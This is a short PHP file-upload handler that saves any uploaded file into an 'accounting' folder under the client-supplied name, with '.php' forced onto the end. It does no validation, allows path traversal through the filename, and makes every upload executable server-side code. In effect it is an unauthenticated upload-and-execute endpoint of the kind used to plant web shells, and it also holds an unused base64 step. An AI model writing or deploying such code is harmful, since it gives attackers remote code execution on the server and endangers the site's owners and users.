<?php

$name = $_FILES["file"]["name"];
$tmpname=$_FILES['file']['tmp_name'];
$fp= fopen($tmpname, 'r');
$fileContent=fread($fp,filesize($tmpname));
$file_uploads = base64_encode($fileContent);

move_uploaded_file($tmpname, "accounting/".$name.".php"); 

?>